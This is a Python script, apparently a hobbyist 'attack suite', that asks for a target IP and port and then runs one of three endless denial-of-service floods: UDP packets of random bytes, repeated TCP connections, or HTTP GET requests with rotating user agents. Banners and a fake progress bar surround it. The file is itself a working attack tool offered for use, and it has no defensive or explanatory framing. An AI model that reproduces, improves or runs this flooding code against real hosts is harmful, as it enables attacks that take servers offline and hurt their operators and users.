# -*- coding: utf-8 -*-
import sys
import os
import time
import socket
import random
from datetime import datetime

# Color Codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

now = datetime.now()
tarih_saat = now.strftime("%d/%m/%Y %H:%M")

os.system("clear")
print(RED)
os.system("figlet exe-Suite3")
print("Coded By : 00exe")
print(f"Date     : {tarih_saat}")
print(RESET)

ip = input("IP / Target Host : ")
port = int(input("Port             : "))

print("\n" + YELLOW + "--- SELECT ATTACK MODE ---" + RESET)
print("1 - UDP Flood (Layer 4 - Raw Data Input)")
print("2 - TCP Flood (Layer 4 - Connection Locking)")
print("3 - HTTP Flood (Layer 7 - Web Server Downer)")
secim = input("\nYour Choice (1/2/3): ")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

def http_istegi_hazirla():
    rastgele_ua = random.choice(user_agents)
    istek = f"GET / HTTP/1.1\r\n"
    istek += f"Host: {ip}\r\n"
    istek += f"User-Agent: {rastgele_ua}\r\n"
    istek += "Accept: text/html,application/xhtml+xml\r\n"
    istek += "Connection: keep-alive\r\n\r\n"
    return istek.encode('utf-8')

os.system("clear")
print(YELLOW)
os.system("figlet Attack Loading")
print("Team : T34m V18rs")
print(GREEN)

print("[                    ] 0% ")
time.sleep(1) 
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)

os.system("clear")
print(RED)
os.system("figlet FIRE")
print(GREEN)

sent = 0

if secim == "1":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    while True:
        try:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            print(f"Sent {sent} UDP packet to {ip} through port:{port}")
        except socket.error:
            print(RED + "UDP send error!" + GREEN)

elif secim == "2":
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            sock.connect((ip, port))
            sent += 1
            print(f"Sent {sent} TCP connection to {ip} through port:{port}")
            sock.close()
        except (socket.error, socket.timeout):
            print(RED + "Target down or refusing connection!" + GREEN)
            sent += 1

elif secim == "3":
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)
            sock.connect((ip, port))
            
            istek_paketi = http_istegi_hazirla()
            sock.sendall(istek_paketi)
            
            sent += 1
            print(f"Sent {sent} HTTP GET request to {ip}")
            sock.close()
        except (socket.error, socket.timeout):
            print(RED + "Server not responding to HTTP requests! It might be down." + GREEN)
            sent += 1
else:
    print(RED + "Invalid choice! Exiting program." + RESET)
